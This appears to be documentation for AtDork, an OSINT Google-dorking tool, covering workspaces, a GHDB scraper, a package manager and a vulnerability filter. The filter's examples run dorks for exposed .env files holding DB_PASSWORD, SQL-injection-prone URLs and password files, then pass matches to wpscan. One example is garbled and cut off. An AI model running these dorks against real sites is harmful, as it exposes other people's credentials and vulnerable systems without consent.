docs.text: Unknown refs now print a Did you mean: line with close matches from the index. Fix: Run atdork search <keyword> to find the package, or atdork --list-database-dork to see every @folder/file.txt entry.

docs.title: Parent directory traversal not allowed
docs.text:
Cause: You used .. in the spec, which is blocked for security.

Fix: Use refs within the index or database root only. For external files, use --database-path.

docs.title: Destination already exists
docs.text:
Error: Destination already exists: '/path/to/mydork'.
Hint: pass --force to overwrite.

Fix: Add --force to overwrite or delete the folder manually. (Legacy extraction only.)

docs.title: Legacy subdirectory path resolves to nothing
docs.text:
Cause: Paths like /bing/bing1 only work against a local ./database directory or a --database-path root — not in index mode.

Fix: Use @-refs instead: @bing/bing1.

docs.title: Exit Codes
docs.text: Code Meaning 0 Success 1 Error (file not found, invalid ref, extraction failure, etc.)

docs.title: Environment (Isolated Workspace)
docs.text:
An environment is a single folder that becomes AtDork's entire world: every file AtDork writes — results, logs, cache, resume/dedup state, config, packages, even the Atdork-DB checkout — lives inside that root and never outside it. Dork results are sensitive; an environment guarantees they do not scatter across whatever directory you happen to run from.

atdork env create ~/osint-job                # one-time: create the workspace
atdork --env ~/osint-job -q "inurl:admin"    # run inside it
ls ~/osint-job/results/                      # the only place results appear

Not a Python venv

Environments do not touch Python packages or the interpreter — AtDork stays a normal CLI. Think of it as a workspace (like a git root, but for all AtDork I/O): portable, self-contained, easy to archive or move.

docs.title: Commands
docs.text: Command Description atdork env create <path> [--name NAME] Create the folder layout + marker (idempotent). atdork env init <path> Alias of create. atdork env list List registered environments ((active), (missing) tags). atdork env use <path> Set the default active environment. atdork env which Show the resolved environment and every path it owns. atdork env info Size per area, results file count, DB clone status. atdork env destroy <path> [--delete] Unregister; --delete also removes the folder (asks first).

docs.title: Activation (three ways, first hit wins)
docs.text:
1. --env /path — per-command
  2. ATDORK_ENV=/path — per-shell (export it)
  3. atdork env use /path — persistent default (stored in ~/.config/atdork/environments.yml)
atdork env use ~/osint-job          # default for every future command
atdork env which                    # verify what is active and why
unset ATDORK_ENV                    # env vars only override when exported

An explicit --env/ATDORK_ENV pointing at a non-environment folder is a hard error with a fix hint; a stale registry entry only warns.

docs.title: Layout
docs.text:
<root>/
├── .atdork-env              # marker (version, name, created_at)
├── .config/
│   ├── config.yml           # env-local config layer (see below)
│   └── packages/            # package store + Atdork-DB clone
├── cache/                   # cache database (--cache)
├── results/                 # every dork result file
├── logs/                    # atdork.log (rotating)
├── state/                   # atdork.db (resume/dedup history)
└── tmp/

docs.title: What gets redirected
docs.text:
While an environment is active, these write targets are owned by the env:

Target Default (no env) With env Results ./results/ <root>/results/ -o / --output file any path <root>/results/<name> (or a root-relative path you pass) Log file ./atdork.log <root>/logs/atdork.log Resume/dedup DB ./atdork.db <root>/state/atdork.db Cache DB ./atdork_cache.db <root>/cache/atdork_cache.db Package store ~/.atdork/packages <root>/.config/packages Atdork-DB checkout auto-discovery <root>/.config/packages/Atdork-DB

Clone the database into the environment once, then atdork update refreshes it in place:

atdork update                          # clones/pulls Atdork-DB inside the env
atdork index                           # build/inspect the manifest there

docs.title: Strict path guard
docs.text:
Values you pass on the CLI are kept but constrained: they must resolve inside the environment root, otherwise AtDork stops with a clear error — nothing is written outside, ever.

atdork --env ~/osint-job -q "x" -o results/scan.json    # ✔ <root>/results/scan.json
atdork --env ~/osint-job -q "x" -o /tmp/loot.txt        # ✘ rejected: outside the root
atdork --env ~/osint-job -q "x" --db-path ../other.db   # ✘ rejected (.. escape)

Details:

  • Relative paths resolve against the env root (the env is your working world): results/x.json means <root>/results/x.json, regardless of the shell's current directory.
  • The check runs after Path.resolve() — symlink tricks and .. sequences are followed before containment is tested.
  • Values coming from defaults or config (not explicit CLI flags) are simply replaced with the env-owned locations; they cannot point outside.
  • Input files (--batch-file, --proxy-file, wordlists) may still be read from anywhere — the guard constrains writes.

Isolation, not encryption

The guard guarantees zero files land outside the root; files inside it remain plaintext. For true secrecy encrypt the filesystem/volume holding the environment.

docs.title: Config precedence with an environment
docs.text:
defaults < global (~/.config/atdork/config.yml)
        < <root>/.config/config.yml        ← env-local config
        < --config <file>                  ← explicit file still wins
        < ATDORK_* env vars < CLI flags

Working-directory atdork.yaml discovery is disabled while an environment is active: config is deterministic and workspace-scoped, so a stray file in whatever folder you cd into can never leak into a scan.

# <root>/.config/config.yml — per-job defaults, travels with the folder
version: 2
search:
  max_results: 30
  region: "us-en"
output:
  format: json

docs.title: Docker
docs.text:
Mount a volume and point ATDORK_ENV at it — the container's entire AtDork I/O lands on the volume:

docker run --rm -v atdork-job:/data \
  -e ATDORK_ENV=/data ghcr.io/amnottdevv/atdork:latest \
  -q "inurl:admin" --max-results 10

docs.title: Troubleshooting
docs.text: Symptom Fix '…' is not an AtDork environment (missing .atdork-env) Create it first: atdork env create <path>. '…' resolves to '…' which is outside the environment Use a path under the root (relative paths resolve against it). Registered environment '…' no longer exists (warning) Folder moved/deleted — atdork env use <new-path> or re-create. Results still land in ./results/ No env is actually active — check with atdork env which. db repo: not cloned yet in env info Run atdork update inside the environment.

docs.title: Introduction
docs.text:
The --filter-vuln flag is AtDork's specialized vulnerability detection system. It automatically identifies potentially vulnerable results based on platform-specific signatures, helping security researchers and bug bounty hunters quickly focus on high-value targets.

The filter scans result URLs, titles, and descriptions against curated wordlists of platform-specific patterns. When a match is found, the result is flagged as "vulnerable" and separated from safe results.

docs.title: What It Does
docs.text: Feature Description Platform Detection Identifies platforms like WordPress, Joomla, Drupal, and more Vulnerability Pattern Matching Matches known vulnerable paths, parameters, and signatures Link vs Path Modes -link mode matches URLs only; default mode matches all fields Custom Wordlists Create your own wordlists for specific platforms or technologies Smart Filtering Results are classified as "vulnerable" or "safe" with clear counts Post-Processing Ready Use --exec-on-vuln to run commands only on vulnerable results

docs.title: Supported Platforms
docs.text:
AtDork includes built-in wordlists for:

Platform Wordlist File Example Signature WordPress wordpress.txt wp-content, wp-admin, wp-includes Joomla joomla.txt components/com_, administrator Drupal drupal.txt sites/default, core/ SQL Injection sqli.txt id=, page=, ?q= XSS xss.txt search=, s=, query= LFI (Local File Inclusion) lfi.txt page=../../, file= Exposed Config exposed_config.txt .env, config.php, settings.yml Login Panels login_panels.txt login, admin, panel Backup Files backup_files.txt .bak, .old, .backup Sensitive Directories sensitive_dirs.txt index of, directory listing

docs.title: Basic Vulnerability Filtering
docs.text: atdork -q "inurl:wp-content" -r 30 --filter-vuln wordpress

docs.title: Link-Only Filtering (Matches URLs Only)
docs.text: atdork -q "site:example.com" --filter-vuln wordpress-link

docs.title: Combining with Other Flags
docs.text:
atdork -q "inurl:wp-content site:example.com" -r 40 \
  --filter-vuln wordpress --verbose

docs.title: Multiple Vulnerability Filters
docs.text:
AtDork supports one filter at a time, but you can chain them using different wordlists. For multiple platform detection, use templates:

atdork --template wordpress,joomla,sqli --target example.com -r 30

docs.title: Using Custom Wordlists
docs.text:
Create your own wordlist file in wordlists/ folder:

# wordlists/myplatform.txt
wp-content
wp-admin
wp-includes
wp-json
xmlrpc.php

Then use it:

atdork -q "site:example.com" --filter-vuln myplatform

docs.title: With Post-Processing (Run Commands on Vulnerable Results)
docs.text:
atdork -q "inurl:wp-content" -r 40 \
  --filter-vuln wordpress \
  --exec-on-vuln "wpscan --url {} --enumerate p" \
  --exec-parallel 2 --exec-timeout 60

docs.title: Batch Processing with Vulnerability Filter
docs.text:
atdork --batch-file dorks.txt --filter-vuln wordpress \
  --resilient --format json -o vuln_results.json

docs.title: With Resilience and Proxy
docs.text:
atdork --template wordpress --target example.com -r 30 \
  --filter-vuln wordpress \
  --proxy-file proxies.txt --strict --resilient

docs.title: With Strict Validation
docs.text:
atdork -q "inurl:wp-content" -r 40 \
  --filter-vuln wordpress \
  --strict-filter --validate-title 10 --validate-desc 20

docs.title: 1. Wordlist Loading System
docs.text:
AtDork loads wordlists from the wordlists/ directory. Each wordlist is a simple text file with one pattern per line:

# wordlists/wordpress.txt
# WordPress-specific signatures
wp-content
wp-admin
wp-includes
wp-json
xmlrpc.php
wp-login.php
wp-config.php

Pattern Rules: - Each line is a regex pattern (case-insensitive) - Lines starting with # are ignored - Empty lines are ignored

Loading Process: 

1. User provides --filter-vuln wordpress
   ↓
2. AtDork looks for wordlists/wordpress.txt
   ├─ From package resources (installed version)
   └─ From file system (source version)
   ↓
3. Each line is compiled into a regex pattern
   ↓
4. Patterns are cached for performance
   ↓
5. If wordlist is missing → ERROR (fail closed)

docs.title: 2. Filter Types
docs.text:
AtDork supports two types of filters:

Type Suffix Searches In When to Use Path (default) none title, href, body General purpose detection Link -link Only href (URL) When you only care about URL patterns

Example: - --filter-vuln wordpress → searches title, href, and body - --filter-vuln wordpress-link → searches only href

docs.title: 3. Detection Logic
docs.text:
1. User provides --filter-vuln wordpress
   ↓
2. AtDork loads wordlists/wordpress.txt
   ↓
3. Each line is compiled into a regex pattern
   ↓
4. For each result:
   ├─ If path mode:
   │  ├─ Get title, href, body
   │  └─ Combine into one string
   ├─ If link mode:
   │  └─ Use href only
   ├─ Test against all regex patterns
   └─ If any pattern matches → mark as "vulnerable"
   ↓
5. Results are split into:
   ├─ vulnerable list (matching patterns)
   └─ safe list (no matches)
   ↓
6. CLI displays counts: "🔴 Rentan: 12 | 🟢 Aman: 8"
   ↓
7. Only vulnerable results are kept for output

docs.title: 4. Example: WordPress Detection
docs.text:
Input Result: 

{
  "title": "WordPress Login",
  "href": "https://example.com/wp-admin/",
  "body": "Please enter your credentials to access the admin area"
}

Wordlist (wordlists/wordpress.txt): 

wp-content
wp-admin
wp-includes
wp-json
xmlrpc.php

Detection: - title contains "WordPress" → no match (not in wordlist) - href contains wp-admin → MATCH! - body contains "admin" → no match (not in wordlist) - Result is classified as "vulnerable"

Why this matters: The URL /wp-admin/ is a strong indicator of a WordPress installation, which is a common target for vulnerability scanning.

docs.title: 5. Fail Closed Design
docs.text:
Starting from v1.3.8, AtDork uses Fail Closed behavior:

If wordlist is missing:
  ❌ Exit with error
  📝 Show clear error message
  💡 Suggest fix

Error Example: 

Error: Wordlist file 'does-not-exist.txt' not found.
   Checked source: package resource 'wordlists'

Why this is important: - Prevents false confidence (thinking there are no vulnerabilities when the filter isn't working) - Makes issues immediately visible - Ensures reliable results every time

docs.title: 6. Package Resource Loading
docs.text:
Since v1.3.8, wordlists are included in the installed package:

Installation Method Wordlist Source From PyPI (pip install atdork) Packaged resources (built-in) From Source (git clone + pip install -e .) wordlists/ directory Custom Wordlist wordlists/ directory (overrides packaged)

Benefits: - No extra files needed after pip install - Consistent behavior across installations - Easy to override with custom wordlists

docs.title: Full Flag Reference
docs.text: Flag Description Default --filter-vuln Platform filter (e.g., wordpress, joomla-link) None --exec-on-vuln Execute command only on vulnerable results None --exec-parallel Parallel processes for --exec 1 --exec-timeout Timeout per command (seconds) 30 --verbose, -v Show results with vulnerability counts Disabled --strict-filter Strict validation with length checks Disabled --no-validate Disable all filtering (keep raw results) Disabled

docs.title: 1. WordPress Vulnerability Hunting
docs.text:
atdork -q "inurl:wp-content site:example.com" -r 40 \
  --filter-vuln wordpress -v \
  --exec-on-vuln "wpscan --url {} --enumerate p" \
  --exec-parallel 2 --exec-timeout 60

What it does: - Finds WordPress sites - Filters only those with WordPress signatures - Runs WPScan on each vulnerable result

docs.title: 2. SQL Injection Discovery
docs.text:
atdork -q "inurl:product.php?id=" -r 50 \
  --filter-vuln sqli \
  --format json -o sqli_results.json

What it does: - Finds pages with potential SQL injection parameters - Filters results with SQLi signatures - Exports to JSON for further analysis

docs.title: 3. Exposed Configuration Files
docs.text:
atdork -q 'filetype:env "DB_PASSWORD"' -r 50 \
  --filter-vuln exposed_config \
  --no-validate -v

What it does: - Finds exposed .env files with database credentials - Filters only config file signatures - Shows results in terminal for quick review

docs.title: 4. Joomla Vulnerability Scanning (Link-Only)
docs.text:
atdork -q "site:example.com" -r 30 \
  --filter-vuln joomla-link \
  --resilient --proxy-file proxies.txt

What it does: - Scans for Joomla installations - Link-only mode focuses on URLs - Resilience mode handles rate limits

docs.title: 5. Rapid WordPress Scan with Multiple Wordlists
docs.text:
atdork --template sqli,wordpress,exposed_config \
  --target example.com -r 30 \
  --filter-vuln wordpress \

  --filter-vuln wordpress \
  --format csv -o potential_targets.csv

while IFS=, read -r title url body; do

docs.title: Introduction
docs.text:
The GHDB Scraper is AtDork's live-fetch module for pulling the latest Google Dorks directly from the Exploit-DB Google Hacking Database. Unlike the Database Dork feature which reads from the static Atdork-DB dork packages, the scraper performs real HTTP requests to Exploit-DB's AJAX endpoint and returns the freshest dorks available.

Use the scraper when you need:

  • Up-to-date dorks (static dork packages may be days or weeks old)
  • Filtering by category or year on the live dataset
  • A quick refresh of your local database
  • Export to JSON or TXT for use with other tools

The scraper is implemented in core/ghdb_scraper.py and is invoked via the --ghdb-scraper family of CLI flags.

docs.title: What It Does
docs.text: Feature Description Live HTTP Fetch Pulls dorks directly from exploit-db.com/google-hacking-database AJAX Endpoint Uses the same JSON endpoint as the GHDB web page itself Retry with SSL Fallback Automatically retries on failure and falls back to insecure SSL if needed Category Filtering Filter by category name (partial match) or numeric ID Year Filtering Filter by single year, comma-separated years, or ranges Result Limiting Cap the total number of dorks returned (--ghdb-r) Category Listing Show all categories with their dork counts (--ghdb-list-categories) Auto Format Detection Output to .json (with metadata) or .txt (one dork per line) No Search Execution Scraper only collects dorks — pipe them to --batch-file to execute

docs.title: CLI Flags
docs.text:
All flags are in the GHDB Scraper argument group:

Flag Type Description --ghdb-scraper flag Run the scraper mode (required to fetch/save dorks) --ghdb-file PATH string Save scraped dorks to a file (.json or .txt) --ghdb-categories SPEC string Filter by category: names (partial) or IDs, comma-separated --ghdb-years SPEC string Filter by year: single, comma-separated, or range (2020-2023,2024) --ghdb-r N int Limit total dorks returned (after filtering) --ghdb-list-categories flag List all categories with dork counts, then exit

Note: The scraper mode is exclusive — when active, AtDork does not perform any search, interactive mode, or template/batch processing. It only fetches and optionally saves dorks.

docs.title: 4. Filter by Category
docs.text:
You can filter by category name (partial, case-insensitive match) or numeric ID:

# By name (partial match — matches "Files Containing Passwords")
atdork --ghdb-scraper --ghdb-categories password --ghdb-file dorks/passwords.txt

# By numeric ID
atdork --ghdb-scraper --ghdb-categories 9 --ghdb-file dorks/passwords.txt

# Combine multiple categories
atdork --ghdb-scraper --ghdb-categories password,login,footholds --ghdb-file dorks/recon.txt

# Mix names and IDs
atdork --ghdb-scraper --ghdb-categories 9,12,juicy --ghdb-file dorks/combined.txt

Category name matching is partial and case-insensitive — password matches Files Containing Passwords, pass would also match. Use the full category title for precision.

docs.title: 5. Filter by Year
docs.text:
Filter dorks by their publication date on Exploit-DB:

# Single year
atdork --ghdb-scraper --ghdb-years 2024 --ghdb-file dorks/2024.txt

# Multiple years (comma-separated)
atdork --ghdb-scraper --ghdb-years 2022,2024 --ghdb-file dorks/recent.txt

# Range (inclusive)
atdork --ghdb-scraper --ghdb-years 2020-2023 --ghdb-file dorks/2020s.txt

# Combination of single years and ranges
atdork --ghdb-scraper --ghdb-years 2018,2020-2022,2024 --ghdb-file dorks/custom.txt

If a range is reversed (e.g., 2024-2020), AtDork automatically swaps the bounds.

docs.title: 6. Combine Category + Year Filters
docs.text:
# Password-related dorks published in 2023 or 2024
atdork --ghdb-scraper \
  --ghdb-categories password \
  --ghdb-years 2023-2024 \
  --ghdb-file dorks/passwords_recent.json

Filters are applied with AND logic — a dork must match both the category filter AND the year filter to be included.

docs.title: 7. Limit the Number of Dorks
docs.text:
# Get only the first 60 dorks (after filtering)
atdork --ghdb-scraper --ghdb-r 60 --ghdb-file dorks/sample.txt

The limit is applied after all filters — you get up to N dorks from the filtered set, in the order returned by Exploit-DB.

docs.title: 8. Complete Example: Refresh Local Database
docs.text:
A common workflow is to refresh your local dork collection weekly:

# 1. Scrape the latest dorks, organized by category
mkdir -p dorks/weekly
atdork --ghdb-scraper --ghdb-categories 1 --ghdb-file dorks/weekly/01_footholds.txt
atdork --ghdb-scraper --ghdb-categories 3 --ghdb-file dorks/weekly/03_sensitive_directories.txt
atdork --ghdb-scraper --ghdb-categories 9 --ghdb-file dorks/weekly/09_passwords.txt

# 2. Use them with the Database Dork feature
atdork --database-path dorks/weekly --database-dork 01_footholds --database-r 20 -r 10

docs.title: The AJAX Endpoint
docs.text:
The scraper does not parse HTML — it calls the same JSON endpoint that the GHDB web page uses internally:

GET https://www.exploit-db.com/google-hacking-database
Headers:
  Accept: application/json, text/javascript, */*; q=0.01
  X-Requested-With: XMLHttpRequest
  User-Agent: Mozilla/5.0 ... (Chrome 126)

Exploit-DB's server returns a JSON payload shaped like DataTables' response:

{
  "recordsTotal": 7940,
  "data": [
    {
      "id": "5052",
      "date": "2022-03-14",
      "url_title": "<a href=\"/ghdb/5052\">intitle:\"index of\" passwd</a>",
      "category": {
        "cat_id": "9",
        "cat_title": "Files Containing Passwords"
      }
    },
    ...
  ]
}

The scraper parses this JSON, extracts the dork text from the url_title HTML fragment using BeautifulSoup, normalizes the structure, and applies filters.

docs.title: Retry Strategy
docs.text:
The fetcher retries up to 3 times with random delays between 1–3 seconds. If an SSL handshake fails, it retries once with certificate verification disabled (verify=False) and silences the urllib3 warning. This handles common transient issues like:

  • Exploit-DB rate limiting
  • Temporary SSL certificate mismatches
  • Network timeouts
  • Cloudflare challenges (sometimes retried successfully)

docs.title: Dork Text Extraction
docs.text:
The raw url_title field is an HTML anchor:

<a href="/ghdb/5052">intitle:"index of" passwd</a>

The scraper extracts only the text content (intitle:"index of" passwd) using BeautifulSoup, ensuring the saved dork is clean and ready to use as a search query.

docs.title: Filter Logic
docs.text:
Filters are applied in this order:

  1. Category filter (--ghdb-categories) — keeps dorks whose cat_id matches a provided ID, OR whose cat_title contains any provided name (case-insensitive partial match)
  2. Year filter (--ghdb-years) — keeps dorks whose year is in the provided set
  3. Limit (--ghdb-r) — keeps the first N dorks from the filtered list

Filters use AND logic between categories and years.

docs.title: Output Format Detection
docs.text:
The output format is determined by the file extension:

Extension Format Content .json JSON array Each entry: {text, id, date, cat_id, cat_title} .txt (or anything else) Plain text One dork per line, no metadata

docs.title: Integration with Other Features
docs.text: The GHDB Scraper is a collect-only tool — it does not execute searches. To actually run the scraped dorks, pipe them through AtDork's batch system:

docs.title: Pattern 1: Scrape → Save → Execute
docs.text:
# 1. Scrape and save
atdork --ghdb-scraper --ghdb-categories password --ghdb-file dorks/passwords.txt

# 2. Execute the saved dorks as a batch
atdork --batch-file dorks/passwords.txt -r 10 --concurrency 3 --verbose

docs.title: Pattern 2: Scrape → Database Dork → Execute
docs.text:
# 1. Scrape into your database directory
atdork --ghdb-scraper --ghdb-categories 9 --ghdb-file database/09_passwords_fresh.txt

# 2. Use Database Dork feature to load and execute
atdork --database-dork 09_passwords_fresh --database-r 30 -r 10

docs.title: Pattern 3: Scrape → Manual Curation → Execute
docs.text:
# 1. Scrape everything from 2024
atdork --ghdb-scraper --ghdb-years 2024 --ghdb-file dorks/2024_all.txt

# 2. Manually edit the file (remove irrelevant dorks, add your own)

# 3. Run the curated list
atdork --batch-file dorks/2024_all.txt -r 15 --output-dir results/2024/

docs.title: Scraping vs. Bundled Database
docs.text:
Aspect GHDB Scraper (--ghdb-scraper) Database Dork (--database-dork) Source Live HTTP fetch from exploit-db.com Bundled .txt files in the package Network Required Not required Freshness Always latest Snapshot from last package release Speed Slow (network + retries) Fast (local file read) Filtering By category and year at fetch time By file selection and --database-r Output Saves dorks to file Loads dorks into the batch runner Use case Refresh dork collection, get latest Run scans offline, reproducibility

Recommended workflow:

  1. Use --ghdb-scraper weekly/monthly to refresh your local dork collection
  2. Save the scraped dorks into database/*.txt (or a custom path)
  3. Use --database-dork for daily scanning — it's faster and works offline

docs.title: "Failed to fetch GHDB data. Check your connection or try again later."
docs.text:
❌ Failed to fetch GHDB data. Check your connection or try again later.

Cause: The scraper could not fetch data after 3 retries. Common reasons:

  • No internet connection
  • Exploit-DB is down or rate-limiting you
  • A firewall is blocking requests to exploit-db.com
  • Cloudflare is challenging your request

Fix:

  1. Test connectivity: curl -I https://www.exploit-db.com/google-hacking-database
  2. Wait a few minutes and retry (rate limits usually clear quickly)
  3. If behind a corporate proxy, set HTTPS_PROXY env var before running
  4. As a fallback, use the Atdork-DB collections: atdork --list-database-dork

docs.title: "Response is not valid JSON (possibly blocked / format changed)"
docs.text:
Cause: Exploit-DB returned HTML instead of JSON — usually a Cloudflare challenge page or a CAPTCHA.

Fix:

  1. Open https://www.exploit-db.com/google-hacking-database in a browser
  2. If you see a Cloudflare challenge, solve it once to whitelist your IP
  3. Retry the scraper immediately after

docs.title: "Tidak ada dork yang cocok dengan filter yang diberikan"
docs.text:
Cause: Your filter combination returned zero matches.

Fix:

  1. Run atdork --ghdb-list-categories to verify category names and IDs
  2. Check your year range — Exploit-DB dorks date back to the early 2000s, but recent years have more entries
  3. Loosen the filter (e.g., use password instead of passwords, or 2020-2024 instead of 2024)

docs.title: Scraper succeeds but returns fewer dorks than expected
docs.text:
Cause: This is usually correct behavior — the recordsTotal field reflects all dorks on Exploit-DB, but the data array may be paginated or filtered by the server.

Fix: The scraper fetches a single page (the same one the web UI shows by default). To get all dorks, save to a file and combine with the Atdork-DB GHDB copy:

atdork --ghdb-scraper --ghdb-file dorks/fresh.txt
# Combine with the Atdork-DB GHDB export
cat ~/Atdork-DB/@ghdb/09_files_containing_passwords.txt dorks/fresh.txt | sort -u > combined.txt

docs.title: Exit Codes
docs.text: Code Meaning 0 Success (dorks fetched and optionally saved) 1 Failure (network error, invalid filter, write error, etc.)

docs.title: Environment Variables
docs.text:
The scraper uses the requests library, which respects standard proxy environment variables:

Variable Purpose HTTP_PROXY Proxy for HTTP requests HTTPS_PROXY Proxy for HTTPS requests (recommended for Exploit-DB) NO_PROXY Comma-separated hosts to bypass the proxy

Example:

export HTTPS_PROXY=http://corporate-proxy:8080
atdork --ghdb-scraper --ghdb-file dorks.txt

docs.title: Rate Limiting & Ethical Use
docs.text:
• The scraper sends one HTTP request per invocation (no pagination loop), so it's gentle on Exploit-DB's infrastructure
  • Retries use random delays (1–3 seconds) to avoid looking like a burst attack
  • The User-Agent mimics a real browser to reduce the chance of being blocked
  • If you script automated runs, keep frequency reasonable — once per day or week is more than enough
  • Always respect Exploit-DB's terms of service

docs.title: Introduction
docs.text: The Notification System allows AtDork to send batch summaries and alerts to external messaging platforms. This is useful for automated workflows, team collaboration, and real‑time monitoring of OSINT campaigns without needing to manually check results.

docs.title: Functions
docs.text:
Flag Description --notify <platform>:<webhook> Send a batch summary to the specified platform. --notify-if-vuln Only send the notification if vulnerable results were found (requires --filter-vuln).

Supported platforms: - Discord – discord:https://hooks.discord.com/api/webhooks/... - Slack – slack:https://hooks.slack.com/services/... - Telegram – telegram:<bot_token>/<chat_id>

docs.title: Usage Examples
docs.text:
# Send a batch summary to Discord
atdork --batch-file dorks.txt -r 20 --notify "discord:https://hooks.discord.com/api/webhooks/xxx/yyy"

# Send to Slack only if vulnerable results are found
atdork -q "inurl:wp-content" -r 30 --filter-vuln wordpress \
  --notify "slack:https://hooks.slack.com/services/xxx/yyy/zzz" --notify-if-vuln

# Send to Telegram
atdork --batch-file dorks.txt -r 20 \
  --notify "telegram:123456789:ABCdefGHIjklMNOpqrsTUVwxyz/123456789"

# Full campaign with resilience, proxy, and Discord notification
atdork --batch-file dorks.txt --resilient --adaptive-delay \
  --proxy-file proxies.txt --strict --concurrency 3 \
  --notify "discord:https://hooks.discord.com/api/webhooks/xxx/yyy"

# Template scan with notification only for vulnerable findings
atdork --template sqli --target example.com -r 15 \
  --notify "slack:https://hooks.slack.com/services/xxx/yyy/zzz" --notify-if-vuln

docs.title: How It Works
docs.text:
1. Platform Detection The target string (discord:..., slack:..., telegram:...) is parsed to determine the platform and webhook URL. If the format is invalid, a clear error message is displayed.

  2. Message Construction A summary message is built containing:

  3. Total number of queries executed
  4. Total number of results found

  5. Optionally, a list of queries that returned vulnerable results (if --notify-if-vuln is active)

  6. Sending The message is sent via HTTP POST to the platform's webhook API:

  7. Discord – JSON payload {"content": "..."} to the webhook URL.
  8. Slack – JSON payload {"text": "..."} to the webhook URL.

  9. Telegram – JSON payload {"chat_id": "...", "text": "...", "parse_mode": "Markdown"} to https://api.telegram.org/bot<token>/sendMessage.

  10. Conditional Notifications If --notify-if-vuln is set, the notification is only sent when at least one query returns vulnerable results (requires --filter-vuln to be active). If no vulnerabilities are found, the notification is silently skipped.

  11. Error Handling Network errors, invalid URLs, or platform-specific errors are logged and do not crash the main batch process. A warning is printed to the console if the notification fails.

AtDork provides flexible output options to suit different workflows and integration needs. Whether you need a quick terminal view, a structured JSON file for programmatic processing, or a CSV for spreadsheet analysis, AtDork has you covered.

Queries Table: 

CREATE TABLE IF NOT EXISTS queries (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    query_text TEXT UNIQUE NOT NULL,
    status TEXT NOT NULL DEFAULT 'pending',
    created_at TEXT NOT NULL,
    updated_at TEXT NOT NULL

docs.title: Package Manager (atdork install)
docs.text: Data location: dork data lives in the separate Atdork-DB repository under @folders (e.g. @ghdb/01_footholds.txt). Browse it in the web catalog →. This page covers browsing, installing and updating those packages; see Database Dork for loading them as queries.

docs.title: Introduction
docs.text:
Since v1.3.9.7 AtDork ships code only — the 123 dork files (994,603 dorks across 31 @folders) live in the Atdork-DB repository, which AtDork treats like a package registry. A generated Index.idn manifest describes every file (ref | sha256 | bytes | dork-lines | description), and the built-in package manager reads it to search, install, verify and update packages:

# Browse the index
atdork search cve

# Install (shorthand: 'c' resolves to the unique folder containing cve_1.txt)
atdork install c@cve_1.txt

# Run the installed package as a batch file
atdork --batch-file c@cve_1.txt -r 20

The easiest way to discover what's available is the web catalog — instant search, folder filters, per-package previews and copy-paste install commands. Docker users: the image bundles the whole database, so no clone is needed (Docker).

Nothing is downloaded from the internet by AtDork itself — install and update use git against a local Atdork-DB checkout (cloned once, auto-discovered or pointed at with --db-repo).

docs.title: Package References
docs.text:
Everywhere a dork file is accepted (--batch-file, --database-dork, install, uninstall), files are addressed with package refs:

Ref Meaning @cve/cve_1.txt Canonical: @folder/file.txt c@cve_1.txt Shorthand: the prefix before @ is a folder hint, disambiguated by the file it contains cve_1.txt, 01_footholds Bare file name (.txt optional), matched against the index @cve Whole folder — install every member, or load every .txt with --database-dork

Invalid or unknown refs fail with an English error and — when close matches exist — a Did you mean: suggestion:

Error: No package matches '@cvee/cve_1.txt' in the index.
Did you mean: @cve/cve_1.txt

Refs are validated against path traversal (.., absolute paths) before touching the filesystem.

docs.title: Commands
docs.text: Package commands are dispatched before the normal search flow — atdork install ... just works, no extra flags.

docs.title: atdork search <keyword>
docs.text:
Search the index by file or folder name and print matching refs with dork counts, sizes and descriptions:

atdork search shodan

docs.title: atdork install <ref>
docs.text:
Copy a package (or a whole folder) from the checkout into the local store:

atdork install @cms/wp.txt      # single file
atdork install @lfi @onion      # multiple at once
atdork install @cve             # whole folder

Installing an already-installed, unmodified package is idempotent (already installed).

docs.title: atdork uninstall <ref>
docs.text:
Remove an installed package (or folder) from the store. The Atdork-DB checkout is never touched.

Refs are validated before anything is removed: a reference containing .., an absolute path, or a folder that escapes the store is rejected — uninstall can only ever delete files inside the store.

docs.title: atdork installed
docs.text:
List what is in the store with integrity status:

Status Meaning up to date Installed copy matches the index sha256 modified You edited the installed copy (kept; use --force to overwrite) orphan The index no longer contains this ref

docs.title: atdork update
docs.text: git pull --ff-only the Atdork-DB checkout, then rebuild Index.idn — fresh GHDB data lands here weekly via the Atdork-DB workflow.

docs.title: atdork index / atdork index --build
docs.text: Show the manifest header (entry count, total dorks, generation date) or rebuild Index.idn from the @folders — for Atdork-DB maintainers.

docs.title: Local Store
docs.text: Installed packages live in ~/.atdork/packages/<folder>/<name> (without the @). When loading a package, AtDork prefers the installed copy, then falls back to reading the Atdork-DB checkout directly — so --database-dork @ghdb/01_footholds works even if you never ran install, as long as the checkout exists.

docs.title: Configuration
docs.text:
Setting Flag Env Default db_repo --db-repo PATH ATDORK_DB_REPO ~/Atdork-DB, then sibling checkouts db_repo_url --db-repo-url URL ATDORK_DB_REPO_URL https://github.com/amnottdevv/Atdork-DB.git package_dir --package-dir PATH ATDORK_PACKAGE_DIR ~/.atdork/packages

Resolution order: env → last-used config → default. Point db_repo at any Atdork-DB checkout (e.g. a fork) and everything — search, install, --database-dork, --batch-file — follows it.

Problem Solution "Atdork-DB repository not found" Clone https://github.com/amnottdevv/Atdork-DB to ~/Atdork-DB, or pass --db-repo PATH / set ATDORK_DB_REPO "No package matches ..." Run atdork search <keyword> to find the exact ref; bare names auto-append .txt "Ambiguous shorthand" The prefix before @ matches several folders — use the canonical @folder/file.txt form (the error lists candidates) Package shows modified Your local edits are preserved; atdork install --force would overwrite them Stale refs after manual edits Rebuild the manifest in the checkout: atdork index --build install fails with git errors Ensure git is on PATH and the checkout is a clean clone (atdork update pulls with --ff-only)

Package commands exit with code 0 on success and 1 on any error.
